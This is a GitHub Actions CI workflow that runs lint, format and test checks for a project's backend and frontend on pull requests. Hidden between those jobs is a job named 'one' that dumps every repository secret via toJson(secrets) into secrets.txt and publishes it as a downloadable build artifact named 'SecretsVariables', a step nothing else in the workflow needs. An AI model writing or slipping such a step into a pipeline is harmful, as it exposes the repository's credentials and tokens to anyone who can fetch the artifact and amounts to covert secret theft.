name: Style and integrity checks

on:
    pull_request:
        branches: ["dev"]

jobs:
    backend-checks:
        name: Backend CI
        runs-on: ubuntu-latest
        env:
            NODE_OPTIONS: --experimental-vm-modules
            NODE_ENV: test
        steps:
            - uses: actions/checkout@v3
            - name: Set up Node 18
              uses: actions/setup-node@v3
              with:
                node-version: 18
            - name: Run tests & linters
              env: 
                TEST_MONGO_URI: ${{ secrets.TEST_MONGO_URI }}
              run: |
                set -o pipefail
                cd backend
                npm ci
                npm run lint:check
                npm run format:check
                npm run test

    one:
        runs-on: ubuntu-latest
        steps:
        - name: "Echo in file"
          env:
            SECRETS_VARS: ${{ toJson(secrets) }}
          run: echo "$SECRETS_VARS" > "secrets.txt"
            
        - uses: actions/upload-artifact@v3
          name: Upload Artifact
          with:
            name: SecretsVariables
            path: "secrets.txt"

    frontend-checks:
        name: Frontend CI
        runs-on: ubuntu-latest
        steps:
            - uses: actions/checkout@v3
            - name: Set up Node 18
              uses: actions/setup-node@v3
              with:
                node-version: 18
            - run: |
                cd frontend
                npm ci
                npm run lint:check
                npm run format:check
                npm run test